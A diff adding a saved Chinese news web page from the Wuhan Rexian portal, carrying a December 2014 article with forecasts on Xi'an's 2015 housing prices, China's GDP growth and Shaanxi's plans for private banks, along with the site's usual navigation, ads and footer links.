@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head> 
+  <meta charset="UTF-8" /> 
+  <title>2015西安楼市大猜想 房价大跌与大涨都不可能 武汉热线</title> 
+  <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1" /> 
+  <meta name="format-detection" content="telephone=no,address=no,email=no" /> 
+  <link rel="stylesheet" href="http://img.wuhan.net.cn/templates/wuhan/2014/css/main.css" /> 
+  <link rel="stylesheet" href="http://img.wuhan.net.cn/templates/wuhan/2014/sea-modules/alice/base/1.0.2/base-debug.css" /> 
+  <link rel="stylesheet" href="http://img.wuhan.net.cn/templates/wuhan/2014/css/font-awesome.min.css" /> 
+  <script type="text/javascript" src="http://img.wuhan.net.cn/templates/wuhan/2014/sea-modules/seajs/seajs/2.2.0/sea.js"></script> 
+  <script src="http://img.wuhan.net.cn/templates/wuhan/2014/sea-modules/jquery/jquery/1.10.1/jquery.js" type="text/javascript"></script> 
+  <script type="text/javascript" src="http://img.wuhan.net.cn/js/config.js"></script>
+ </head>
+ <body> 
+  <header id="header" class="header none"> 
+   <div class="logowrapper"> 
+    <div class="logo "></div> 
+    <!-- <a class="login-btn">登录</a> 			<a href="javascript:;" class="btn fa fa-angle-down fa-2x"></a>--> 
+   </div> 
+  </header> 
+  <!-- 项部工具条 --> 
+  <div id="topnav" class="mininav"> 
+   <div class="mininavInner"> 
+    <div class="fn-left"> 
+     <a href="http://www.wuhan.net.cn/">首页</a> 
+     <a href="http://info.wuhan.net.cn/zhengwu/zhengwudongtai/" target="_blank">政务</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/" target="_blank">资讯</a> 
+     <a href="http://info.wuhan.net.cn/tech/loushiwanxiang/" target="_blank">房产</a> 
+     <a href="http://info.wuhan.net.cn/tech/zhuangxiuzixun/" target="_blank">家居</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/ent/" target="_blank">娱乐</a> 
+     <a href="http://info.wuhan.net.cn/pub/lvyou/wuhan/lvyyouzixun/" target="_blank">旅游</a> 
+     <!--<a href="http://jt.wuhan.net.cn/" target="_blank">交通</a>--> 
+     <!--<a href="http://116.211.116.184/video/index.php/Home/Index/index" target="_blank">视频</a>--> 
+     <a href="http://m.wuhan.net.cn/install/index1.html" target="_blank">智慧城市</a> 
+    </div> 
+    <div class="fn-right dropdowns"> 
+     <div class="fn-left"> 
+      <span class="user fn-hide" id="signOut">你好,用户名</span> 
+      <ul id="popupsignOut" class="fn-hide ui-popup"> 
+       <li><a href="javascript:;" id="signOutBtn">退出登录</a></li> 
+      </ul> 
+      <a href="javascript:;" id="loginWhol">登录智慧城市<i class="fa fa-angle-down" id="rm"></i></a> 
+      <form method="post" action="" class="loginform"> 
+       <ul id="popupLogin" class="fn-hide ui-popup fn-clear"> 
+        <li><label class="fn-left">手机号</label><input type="text" name="username" id="username" class="form" /></li> 
+        <li><label class="fn-left">密码</label><input type="password" name="password" id="password" class="form" /></li> 
+        <li><input type="button" value="登录" class="btn fn-right" /></li> 
+        <li class="error fn-hide">* 用户名或密码错误</li> 
+       </ul> 
+      </form> 
+     </div> 
+     <div class="topfunc fn-right hidden"> 
+      <a href="javascript:;" class="" id="smartPoint">积分等级<i class="fa fa-angle-down"></i></a> 
+      <ul id="popupPoint" class="fn-hide ui-popup"> 
+       <li><a href="javascript:;" id="level">等级</a></li> 
+       <li><a href="javascript:;" id="currency">金币</a></li> 
+      </ul> 
+      <a href="javascript:;" class="arrow-down" id="personalSetting">
+       <!--热门活动<i class="fa fa-angle-down"></i>--></a> 
+      <ul id="popupSetting" class="fn-hide ui-popup"> 
+       <li><a href="#" target="_blank"></a></li> 
+       <li><a href="#" target="_blank"></a></li> 
+      </ul> 
+     </div> 
+    </div> 
+   </div>
+  </div> 
+  <!-- 通栏广告 --> 
+  <div class="layout mt40 fn-clear"> 
+   <div class=""> 
+    <a href="http://www.wuhan.net.cn/2014/dx/0826/"><img src="http://www.wuhan.net.cn/2014/guanggao/services95070.gif" width="1000" height="70" /></a> 
+   </div>
+  </div> 
+  <!-- LOGO和搜索 --> 
+  <div class="soso soso_small mt12" id="soso"> 
+   <div class="logo" id="whollogo"> 
+    <h1 class="fn-clear"> <a href="http://www.wuhan.net.cn" class="sclogo fn-left"><span class="fn-hide">武汉热线</span></a> <a href="http://www.wuhan.net.cn" class="whlogo fn-left"><span class="fn-hide">武汉热线</span></a> </h1> 
+   </div> 
+   <div class="fn-right" id="searchbar"> 
+    <form action="http://zhannei.baidu.com/cse/search" name="soso_search_box" target="_blank"> 
+     <div class="search" id="sosobar"> 
+      <div id="searchTxt" class="searchTxt"> 
+       <input name="s" type="hidden" value="2404017583689523899" /> 
+       <input type="text" name="q" size="30" id="wholSearchTxt" /> 
+      </div> 
+     </div> 
+     <div class="searchBtn"> 
+      <button id="searchBtn" type="submit" onclick="javascript:;">搜索</button> 
+      <input type="hidden" name="hidden" /> 
+     </div> 
+    </form> 
+   </div>
+  </div> 
+  <!-- 小导航 --> 
+  <div class="nav shortnav" id="mainnav"> 
+   <div class="navInner"> 
+    <div> 
+     <a href="http://info.wuhan.net.cn/pub/news/">资讯首页</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/wuhan/">武汉</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/guonei/">国内</a> 
+    </div> 
+    <div> 
+     <a href="http://info.wuhan.net.cn/pub/news/guoji/">国际</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/shehui/">社会</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/tech/">科技</a> 
+    </div> 
+    <div> 
+     <a href="http://info.wuhan.net.cn/pub/news/ent/">娱乐</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/caijing/">财经</a> 
+     <a href="http://info.wuhan.net.cn/pub/news/shenghuo/">生活</a> 
+    </div> 
+    <div> 
+     <a href="http://info.wuhan.net.cn/news/jcsp/">时评</a> 
+    </div> 
+   </div>
+  </div> 
+  <!-- 主容器 --> 
+  <div class="layout mt12 fn-clear"> 
+   <!-- 面包屑 --> 
+   <div class="breadcrumb"> 
+    <span><i class="fa fa-home"></i> <a href="http://www.wuhan.net.cn/">武汉热线</a> &gt; <a href="http://info.wuhan.net.cn/tech/">房产家居</a> &gt; <a href="http://info.wuhan.net.cn/tech/loushiwanxiang/">楼市万象</a> </span> 
+   </div> 
+   <!-- 左侧容器 --> 
+   <div class="mainBody jrtjMod bd" id="newsContent"> 
+    <div class="newsArticle mt12"> 
+     <h1 class="">2015西安楼市大猜想 房价大跌与大涨都不可能</h1> 
+     <h2 class="fn-clear"> 
+      <div class="fn-left "> 
+       <span>来源:<a href="http://www.rexian.net.cn" target="_blank">热线房产网</a></span> | 
+       <span>发布时间:2014-12-29 15:26</span> 
+      </div> 
+      <div class="fn-right" id="wholsns"> 
+       <div class="bdsharebuttonbox fn-left"> 
+        <span class="fn-left">分享到:</span>
+        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+        <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+        <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+        <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
+        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+       </div> 
+       <div class="fz-adjust fn-left">
+        字号: 
+        <a href="javascript:;" class="small current">小</a> 
+        <a href="javascript:;" class="large">大</a> 
+       </div> 
+      </div> <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdPic":"","bdStyle":"0","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script> </h2> 
+     <div class="recommendNews fn-clear"> 
+      <h3 class="title">推荐阅读</h3> 
+      <!-- 推荐阅读 --> 
+      <ul> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365853.shtml" target="_blank" style="color:#003366;">习近平就载458人客船在长江翻沉作重要指示</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365941.shtml" target="_blank">房价上涨成交量持续攀升 江城楼市出现最红5月</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365986.shtml" target="_blank">新版湖北省旅游条例出台 胁迫购物最高罚2万元</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365937.shtml" target="_blank">武汉&quot;最开放&quot;江滩开园啦 首日有1.6万多人光顾</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365980.shtml" target="_blank">7所在汉部属高校湖北减招544人 打造&quot;精英教育&quot;</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365824.shtml" target="_blank">亚锦赛等赛会相继举行 武汉成为田径界瞩目焦点</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365932.shtml" target="_blank">出入境办证预约新途径 14个中行网点可预约办证</a> </li> 
+       <li> <a href="http://info.wuhan.net.cn/pub/2015/0602/1365952.shtml" target="_blank">武汉:插队加气被阻拦 的哥将的姐拖到野外暴打</a> </li>
+      </ul> 
+     </div> 
+     <!-- 文章内容 --> 
+     <div class="mt12">
+      <!--画中画广告--> 
+      <div style="width:300px;height:250px;float:left;margin:0 14px 14px 14px;padding:2px;border:#ccc 1px solid">
+       <!--<embed flashvars="" pluginspage="http://www.adobe.com/go/getflashplayer" src="http://www.wuhan.net.cn/2015/guanggao/300250.swf"  type="application/x-shockwave-flash" wmode="opaque" allowfullscreen="true" allowscriptaccess="always"  height="250" width="300"></embed>-->
+       <a href="http://www.wuhan.net.cn/2015/dx/040301/"><img src="http://www.wuhan.net.cn/2015/guanggao/dx300250-1.gif" width="300" height="250" /></a>
+      </div> 
+      <p>新的一年,中国经济的增速是多少?陕西民营银行何时诞生?楼市是涨是跌?</p>
+      <p><strong>关键词:楼市</strong></p>
+      <p><strong>大跌与大涨都不可能</strong></p>
+      <p>在取消限购之后,2015年的西安楼市将完全回归市场化,展望2015,西安楼市成交量还会继续上升吗?房价是涨是跌?</p>
+      <p>先看一则消息,上海某房地产研究院发布了《11月份新建商品住宅库存报告》,截至11月底,西安存销比为26个月,这意味着西安楼市库存消化需要26个月。</p>
+      <p>美城机构总经理汪魏分析,在房地产行政调控手段退出市场之后,房地产市场自身的供求关系调节功能成为影响市场走势的主要因素。目前来看,西安房价最近几年涨幅较小,最主要的原因是供应量较大。但是,根据西安房地产市场目前的需求与供应,再结合市场资金面与宏观经济的运行来看,我们预测2015年西安楼市的成交量要高于2014年。从价格来看,随着房地产市场的整体回暖,以及大西安的快速发展,我们预计2015年的西安房价会出现5%-10%的上涨。</p>
+      <p>“西安房价比西边的兰州、东边的郑州、南边的成都价格都低,并不是西安人口不多,西安房价不高最重要的原因是库存量太高。这一点应该引起相关部门的重视,尤其是在土地的供应方面要有计划,不能盲目的无限制的去供应土地,只有在上游控制住了节奏,西安楼市的运行才会更加健康、稳健。”独立地产评论人士李连源分析,“从2015年来看,西安楼市将出现分化,高品质的房子不愁卖,但是同质化、没有竞争力的房子将会遭遇极大的销售压力,这符合目前西安楼市的基本特点。从成交量来看,还将维持在相对高位,因为市场上的刚性需求依然很大。从价格来看,需求与库存决定房价走势,大跌不可能,大涨也不可能,基本会维持目前的现状。”</p>
+      <p><strong>关键词:GDP</strong></p>
+      <p><strong>中国GDP增速预计7%左右</strong></p>
+      <p>“中国 2014 年GDP增速或为7.2%,我们认为中国将把2015年的GDP增长目标从今年的7.5%下调至7%。”澳新银行经济学家刘利刚表示。中国过去几年中通胀水平比较低,目前CPI已经回落至金融危机以来的最低点,更低但更加具有可持续性的经济增速,可以为经济转型奠定基础。</p>
+      <p>刘利刚说,他们团队把2015年中国经济增速预测下调到了7%,中国将通过经济放缓来推动结构改革;预计中国明年的CPI将增长2.5%,略高于今年约2.0%的水平,但总体来看中国的通胀水平将保持在相对温和的水平;从货币政策看,总体宽松和定向发力的思路已经形成,但在政策方面还存在不确定性。整体看,货币政策可调整的空间有限;政府在来年仍将通过多种政策尽力保持房地产市场的稳定发展,这其中的关键因素是政府希望经济稳步转型。</p>
+      <p>中国人民银行研究局首席经济学家马骏表示,明年GDP增速将略放缓到7.1%,但就业和通胀形势保持稳定。劳动年龄人口已经开始下降,经济结构正由制造业主导向服务业主导变化,宏观政策要根据经济、金融情况的变化微调。从底线上来看,只要就业不出现太大问题,就不需要强刺激举措。</p>
+      <p>西安邮电大学经管学院院长张鸿表示,在经济新常态背景下,明年中国经济增速应该在7%左右。他说,其实7%也不低,美国3%,欧洲不到1%。“以前高污染、高成本,减速下来保证质量是好事,只要劳动就业指标在,就不需要再降低。”</p>
+      <p>目前,摩根大通、花旗银行、彭博、中金公司、瑞银证券、申银万国等中外机构发布的报告,预计明年中国会将经济增长目标由7.5%左右下调至7%左右。</p>
+      <p><strong>关键词:民营银行</strong></p>
+      <p><strong>陕西首家民营银行有望诞生</strong></p>
+      <p>12月13日,银监会批准深圳前海微众银行开业,其主推“个存小贷”模式,这是首批试点的5家民营银行中首家获准开业的银行。华商报记者注意到,其早在今年9月就开始发布校园招聘公告,产品策划岗位要求是:对互联网金融产品极度热爱,具备敏捷的洞察和思维能力,有把思考变为现实以满足用户需求的勇气和能力。</p>
+      <p>华商报记者日前从陕西省工商联了解到,陕西不止一家企业已递交了组建民营银行的申请。陕西省工商联工作人员表示,陕西一直在加快组建陕西民营银行。“目前没详细统计,我掌握的情况是,陕西申办民营银行的不止一家。”省工商联一位工作人员介绍,陕西正推进民营银行组建。但是,从企业申报、递交申请到审批涉及流程比较多,陕西民营银行正式成立还需要时间。</p>
+      <p>华商报记者查询发现,早在上半年,陕西和谐投资股份有限公司已向银监会递交了申请。公开资料显示,该公司是由陕西省工商联发起,联合17家民营企业共同出资17亿元组建而成的民营投资集团。</p>
+      <p>此外,有网友发帖称,从工商总局网站查知,估计陕西已有三家民营银行完成预名核准,分别是西京银行股份有限公司、大秦商业银行股份有限公司、和谐银行股份有限公司。</p>
+      <p>12月25日,华商报记者查询发现,2013年12月,国家工商总局企业名称核准公告,和谐银行股份有限公司;11月7日西京银行股份有限公司、大秦商业银行股份有限公司。值得注意的是,今年11月14日,民东银行有限责任公司获得核准,陕西确有一家企业名为陕西民东投资集团有限公司,但跟民营银行有啥关系未能查到。</p>
+      <p>“陕西需要民营银行,企业贷款特别是中小企业需要融资,民营银行可以支持实体经济发展。”西安邮电大学经管学院院长张鸿表示,明年能否获批还要看政策层面。</p> 
+     </div>
+     <!-- @end 文章内容 --> 
+     <h2 class="fn-clear mt100"> 
+      <div class="fn-right "> 
+      </div> </h2> 
+    </div> 
+    <!-- 智慧城市 --> 
+    <div class="city fn-clear"> 
+     <div class="fn-left adtxt"> 
+      <h1>4G城市门户 掌上市民之家</h1> 
+      <p>汇热点新闻,知市政动态,用免费WiFi,查实时交通,</p>
+      <p>游周边美景,买社区鲜菜,揽校园信息,聚便民应用,</p>
+      <p><a href="http://m.wuhan.net.cn/install/" target="_blank">点击下载</a> android/iPhone客户端体验;</p>
+      <p>天翼手机用户发送city到10008获取下载地址。</p>
+      <p>智慧大武汉,精彩小世界,期待您的光临!</p> 
+     </div> 
+     <div class="fn-right qrcode"> 
+      <a href="http://m.wuhan.net.cn/install/" target="_blank"><img src="http://img.wuhan.net.cn/images/2014/qrcode.jpg" alt="" /></a> 
+     </div>
+    </div> 
+    <!-- 表情 --> 
+    <div id="mood" class="cont-mood padd-8"> 
+     <p class="mood-head">您看到此篇文章的感受是:</p> 
+     <ul> 
+      <li><a moodsid="1"><img src="http://img.wuhan.net.cn/apps/mood/images/weixiao.png" title="微笑" /></a><br />微笑<br /><input moodsid="1" type="radio" name="moodradio" value="1" /></li> 
+      <li><a moodsid="2"><img src="http://img.wuhan.net.cn/apps/mood/images/nanguo.png" title="难过" /></a><br />难过<br /><input moodsid="2" type="radio" name="moodradio" value="1" /></li> 
+      <li><a moodsid="3"><img src="http://img.wuhan.net.cn/apps/mood/images/liuhan.png" title="流汗" /></a><br />流汗<br /><input moodsid="3" type="radio" name="moodradio" value="1" /></li> 
+      <li><a moodsid="4"><img src="http://img.wuhan.net.cn/apps/mood/images/xianmu.png" title="羡慕" /></a><br />羡慕<br /><input moodsid="4" type="radio" name="moodradio" value="1" /></li> 
+      <li><a moodsid="5"><img src="http://img.wuhan.net.cn/apps/mood/images/fennu.png" title="愤怒" /></a><br />愤怒<br /><input moodsid="5" type="radio" name="moodradio" value="1" /></li> 
+      <li><a moodsid="6"><img src="http://img.wuhan.net.cn/apps/mood/images/liulei.png" title="流泪" /></a><br />流泪<br /><input moodsid="6" type="radio" name="moodradio" value="1" /></li> 
+     </ul>
+    </div>
+    <!--<div class="digg-share">	<div class="digg fn-left">		<a id="supports" href="javascript:digg.set(677373,1)"><span>0</span><span>0%</span></a>		<a id="againsts" href="javascript:digg.set(677373,0)" class="againsts"><span>0</span><span>0%</span></a>	</div> 	<div class="share-tool f-r">		<a href="javascript:;" onclick="copyToClipboard(window.location.href);return false">【复制网址】</a>		<a href="http://info.wuhan.net.cn/print.php?contentid=677373">【打印】</a>	</div> </div>--> 
+   </div> 
+   <!-- 右侧容器 --> 
+   <div class="layoutRight"> 
+    <!-- ADBox --> 
+    <div class="weibos fn-clear">
+     <a href="http://www.wuhan.net.cn/2015/dx/0403/" class="fn-left" target="_blank"><img src="http://www.wuhan.net.cn/2015/guanggao/dx320320-1.gif" width="320" height="320" alt="" /></a>
+    </div> 
+    <!-- 资讯排行 --> 
+    <div class="rightArea fn-clear mt12 rightNews" id="sideNewsTextTabs"> 
+     <ul class="ui-switchable-nav"> 
+      <h2>资讯排行</h2> 
+      <li>日</li> 
+      <li>周</li> 
+      <li>月</li> 
+     </ul> 
+     <div class="ui-switchable-content"> 
+      <div class="hidden col"> 
+       <ul> 
+        <li><em class="front">1</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365937.shtml" title="武汉“最开放”江滩昨天开园啦 首日有1.6万多人光顾" target="_blank">武汉“最开放”江滩昨天开园啦 首日有1.6</a></li> 
+        <li><em class="front">2</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365853.shtml" title="习近平对东方之星旅游客船翻沉事件作出重要指示" target="_blank">习近平对东方之星旅游客船翻沉事件作出重</a></li> 
+        <li><em class="front">3</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365952.shtml" title="插队加气被的姐阻拦 愤怒的哥将的姐拖到野外暴打" target="_blank">插队加气被的姐阻拦 愤怒的哥将的姐拖到</a></li> 
+        <li><em>4</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365927.shtml" title="湖北省中医院基地综合大楼开门迎客 智能化服务造福患者" target="_blank">湖北省中医院基地综合大楼开门迎客 智能</a></li> 
+        <li><em>5</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365961.shtml" title="重庆现8株金丝楠木 老板开价22套房购买遭拒" target="_blank">重庆现8株金丝楠木 老板开价22套房购买遭</a></li> 
+        <li><em>6</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365947.shtml" title="长江大桥明日凌晨全面体检 公路封路车辆禁行" target="_blank">长江大桥明日凌晨全面体检 公路封路车辆</a></li> 
+        <li><em>7</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365980.shtml" title="7所在汉部属高校湖北减招544人 打造“精英教育”" target="_blank">7所在汉部属高校湖北减招544人 打造“精</a></li> 
+        <li><em>8</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365932.shtml" title="出入境办证预约又有新途径 14个中行网点可预约办证" target="_blank">出入境办证预约又有新途径 14个中行网点</a></li> 
+        <li><em>9</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365941.shtml" title="房价上涨成交量持续攀升 江城楼市出现“最红5月”" target="_blank">房价上涨成交量持续攀升 江城楼市出现“</a></li> 
+        <li><em>10</em><a href="http://info.wuhan.net.cn/pub/2015/0602/1365803.shtml" title="受厄尔尼诺现象影响 武汉城市排渍形势依然严峻" target="_blank">受厄尔尼诺现象影响 武汉城市排渍形势依</a></li>
+       </ul> 
+      </div> 
+      <div class="hidden col"> 
+       <ul> 
+        <li><em class="front">1</em><a href="http://info.wuhan.net.cn/pub/2015/0530/1363786.shtml" title="武汉48个片区将进行旧城改造 主城区多处将变身商务区" target="_blank">武汉48个片区将进行旧城改造 主城区多处</a></li> 
+        <li><em class="front">2</em><a href="http://info.wuhan.net.cn/pub/2015/0529/1362444.shtml" title="武汉国际广场奢侈品五折甩卖 引市民排队疯抢" target="_blank">武汉国际广场奢侈品五折甩卖 引市民排队</a></li> 
+        <li><em class="front">3</em><a href="http://info.wuhan.net.cn/pub/2015/0528/1361452.shtml" title="洪山区拟建两条新路 缓解白沙洲、南湖片区出行拥堵" target="_blank">洪山区拟建两条新路 缓解白沙洲、南湖片</a></li> 
+        <li><em>4</em><a href="http://info.wuhan.net.cn/pub/2015/0601/1365210.shtml" title="郑万高铁已定 湖北规划建设宜襄城际铁路" target="_blank">郑万高铁已定 湖北规划建设宜襄城际铁路</a></li> 
+        <li><em>5</em><a href="http://info.wuhan.net.cn/pub/2015/0527/1359909.shtml" title="汉江首条快速航线开通 武昌至硚口坐轮渡仅半小时" target="_blank">汉江首条快速航线开通 武昌至硚口坐轮渡</a></li> 
+        <li><em>6</em><a href="http://info.wuhan.net.cn/pub/2015/0601/1364904.shtml" title="三口之家驾车探亲全部遇难 爷爷奶奶数次哭晕住院" target="_blank">三口之家驾车探亲全部遇难 爷爷奶奶数次</a></li> 
+        <li><em>7</em><a href="http://info.wuhan.net.cn/pub/2015/0601/1364752.shtml" title="武汉首次对专车平台喊停 10台电动车未办手续被禁上路" target="_blank">武汉首次对专车平台喊停 10台电动车未办</a></li> 
+        <li><em>8</em><a href="http://info.wuhan.net.cn/pub/2015/0529/1362454.shtml" title="武汉一棵价值7万景观树深夜被盗挖移栽到仙桃" target="_blank">武汉一棵价值7万景观树深夜被盗挖移栽到</a></li> 
+        <li><em>9</em><a href="http://info.wuhan.net.cn/pub/2015/0527/1359928.shtml" title="深隧比地铁深管道内可跑车 武汉将研究排水深隧治“看海”" target="_blank">深隧比地铁深管道内可跑车 武汉将研究排</a></li> 
+        <li><em>10</em><a href="http://info.wuhan.net.cn/pub/2015/0529/1362455.shtml" title="武汉30辆私家车当“专车”被查 客管处约谈UBER重申禁令" target="_blank">武汉30辆私家车当“专车”被查 客管处约</a></li>
+       </ul> 
+      </div> 
+      <div class="hidden col"> 
+       <ul> 
+        <li><em class="front">1</em><a href="http://info.wuhan.net.cn/pub/2015/0508/1341649.shtml" title="翼支付“翼+525全家购”礼包大派送" target="_blank">翼支付“翼+525全家购”礼包大派送</a></li> 
+        <li><em class="front">2</em><a href="http://info.wuhan.net.cn/pub/2015/0521/1353959.shtml" title="京福高铁即将开通 7月1日起武汉市民可坐高铁游黄山" target="_blank">京福高铁即将开通 7月1日起武汉市民可坐</a></li> 
+        <li><em class="front">3</em><a href="http://info.wuhan.net.cn/pub/2015/0530/1363786.shtml" title="武汉48个片区将进行旧城改造 主城区多处将变身商务区" target="_blank">武汉48个片区将进行旧城改造 主城区多处</a></li> 
+        <li><em>4</em><a href="http://info.wuhan.net.cn/pub/2015/0525/1357551.shtml" title="武汉超市大幅打折引市民疯狂扫货 特警出动维持秩序" target="_blank">武汉超市大幅打折引市民疯狂扫货 特警出</a></li> 
+        <li><em>5</em><a href="http://info.wuhan.net.cn/pub/2015/0526/1358681.shtml" title="湖北将换1.8万块高速路牌 沌口蔡甸不再标成“武汉”" target="_blank">湖北将换1.8万块高速路牌 沌口蔡甸不再标</a></li> 
+        <li><em>6</em><a href="http://info.wuhan.net.cn/pub/2015/0512/1344779.shtml" title="“武昌第一大盘”无配套中小学 教育局称正在解决" target="_blank">“武昌第一大盘”无配套中小学 教育局称</a></li> 
+        <li><em>7</em><a href="http://info.wuhan.net.cn/pub/2015/0515/1348531.shtml" title="中国电信推出提速降费十大举措" target="_blank">中国电信推出提速降费十大举措</a></li> 
+        <li><em>8</em><a href="http://info.wuhan.net.cn/pub/2015/0518/1350344.shtml" title="疯狂女婿开铲车将岳父家夷为平地 街道被“毁容”(图)" target="_blank">疯狂女婿开铲车将岳父家夷为平地 街道被</a></li> 
+        <li><em>9</em><a href="http://info.wuhan.net.cn/pub/2015/0518/1350162.shtml" title="武汉光谷筹建通航机场 拟选址东湖高新区滨湖街" target="_blank">武汉光谷筹建通航机场 拟选址东湖高新区</a></li> 
+        <li><em>10</em><a href="http://info.wuhan.net.cn/pub/2015/0505/1337348.shtml" title="武汉新建购物中心全球第一 交付面积近100万平米" target="_blank">武汉新建购物中心全球第一 交付面积近100</a></li>
+       </ul> 
+      </div> 
+     </div> 
+    </div> 
+    <!-- ADBox --> 
+    <div class="weibos fn-clear" style="margin-top:10px"> 
+     <a href="http://store.gf.com.cn/im/desktop?channel=whrx21" class="fn-left" target="_blank"><img src="http://www.wuhan.net.cn/2015/guanggao/guangfa320110.jpg" width="320" height="110" alt="" /></a>
+     <!--<embed flashvars="" pluginspage="http://www.adobe.com/go/getflashplayer" src="http://www.wuhan.net.cn/2014/guanggao/ly320320.swf"  type="application/x-shockwave-flash" wmode="opaque" allowfullscreen="true" allowscriptaccess="always"  height="320" width="320"></embed>-->
+    </div> 
+   </div> 
+  </div> 
+  <!-- 友情链接 --> 
+  <div class="layout footlinks mt12"> 
+   <ul class=""> 
+    <li> <strong>友情链接:</strong> <a href="http://www.cnhubei.com/" target="_blank">荆楚网</a> <a href="http://www.cjn.cn/" target="_blank">长江网</a> <a href="http://www.cnhan.com/" target="_blank">汉网</a> <a href="http://hb.sina.com.cn/" target="_blank">新浪湖北</a> <a href="http://hubei.kaiwind.com/" target="_blank">凯风湖北</a> <a href="http://www.cnxianzai.com/" target="_blank">现在网</a> <a href="http://www.rexian.net.cn/" target="_blank">热线房产网</a> <a href="http://bbs.rexian.net.cn/" target="_blank">武汉圈</a> <a href="http://www.deyi.com/" target="_blank">得意生活</a> <a href="http://www.whtv.com.cn/" target="_blank">武汉网络电视</a> <a href="http://www.hbtv.com.cn/" target="_blank">湖北网台</a> <a href="http://www.ccdi.gov.cn/" target="_blank">纪委监察部</a> <a href="http://www.hb122.org/" target="_blank">湖北道路交通安全网</a> <a href="http://www.hb.xinhuanet.com/" target="_blank">新华湖北</a> <a href="http://www.cncn.org.cn/" target="_blank">中国社区网</a> </li> 
+    <li> <strong>精彩网址:</strong> <a href="http://www.wuhanbus.com/" target="_blank">公交站点</a> <a href="http://www.12306.cn/" target="_blank">订火车票</a> <a href="http://www.hbglky.com/index.shtml" target="_blank">公路客运</a> <a href="http://www.whgjj.org.cn/" target="_blank">公积金</a> <a href="http://www.whcrj.gov.cn/" target="_blank">证件下载</a> <a href="http://www.feeyo.com/flightsearch.htm" target="_blank">航班</a> <a href="http://www.whfg.gov.cn/" target="_blank">房管局</a> <a href="http://www.yp.net.cn/schinese/search/AreaPostCode.asp" target="_blank">邮编</a> <a href="http://www.kiees.cn/" target="_blank">快递之家</a> <a href="http://www.k618.cn/" target="_blank">未来网</a> <a href="http://www.mepire.com/" target="_blank">米派网</a> <a href="http://www.pc3w.com/" target="_blank">电脑沙龙</a> <a href="http://www.zhiyin.com.cn/" target="_blank">知音</a> <a href="http://www.lovewh.com/" target="_blank">武汉电影</a> <a href="http://www.hbyoyo.com/" target="_blank">湖北电影</a> <a href="http://www.newegg.com.cn/" target="_blank">新蛋网</a> <a href="http://www.148com.com/" target="_blank">中律网</a> <a href="http://www.qgny.net/default.html" target="_blank">农业网</a> <a href="http://www.kuanwuhan.com/" target="_blank">武汉宽带</a> </li> 
+    <li> <strong>金融信息:</strong> <a href="http://www.pbc.gov.cn/" target="_blank">人民银行</a> <a href="http://www.icbc.com.cn/" target="_blank">工商银行</a> <a href="http://www.abchina.com/cn/" target="_blank">农业银行</a> <a href="http://www.boc.cn/" target="_blank">中国银行</a> <a href="http://www.ccb.com/" target="_blank">建设银行</a> <a href="http://www.bankcomm.com/" target="_blank">交通银行</a> <a href="http://www.cmbchina.com/" target="_blank">招商银行</a> <a href="http://www.cmbc.com.cn/" target="_blank">民生银行</a> <a href="http://www.hxb.com.cn/" target="_blank">华夏银行</a> <a href="http://www.ecitic.com/" target="_blank">中信金融</a> <a href="http://www.cebbank.com/" target="_blank">光大银行</a> <a href="http://www.spdb.com.cn/" target="_blank">浦发银行</a> <a href="http://www.gdb.com.cn/" target="_blank">广发银行</a> <a href="http://www.hkbchina.com/" target="_blank">汉口银行</a> <a href="http://www.gf.com.cn/" target="_blank">广发证券</a> <a href="http://www.umshb.com/" target="_blank">银商湖北</a> </li> 
+   </ul>
+  </div> 
+  <!-- 版权信息 --> 
+  <div class="layout mt12 footer"> 
+   <div class="copyrights"> 
+    <p class="license">版权所有:中国电信股份有限公司武汉分公司 地址:中国 武汉 武昌珞喻路724号 邮编:430074 本(栏目/频道等)内容由SP提供 欢迎监督举报</p> 
+    <p class="license">[增值电信业务经营许可A2.B1.B2-20090001][文网文[2008]053号][<a href="http://www.wuhan.net.cn/License.html" target="_blank">国家互联网新闻信息服务许可证:4212006004</a>]</p> 
+    <p class="license"><a href="http://www.hbjubao.com:1888/" target="_blank">湖北省违法和不良信息举报平台</a> <a href="http://www.12377.cn/" target="_blank">中国互联网违法和不良信息举报中心</a></p> 
+    <div class="cert-logos"> 
+     <a href="javascript:;"><img src="http://img.wuhan.net.cn/images/2014/ct-logo.jpg" alt="" /></a> 
+     <a href="javascript:;"><img src="http://img.wuhan.net.cn/images/2014/aq-logo.jpg" alt="" /></a> 
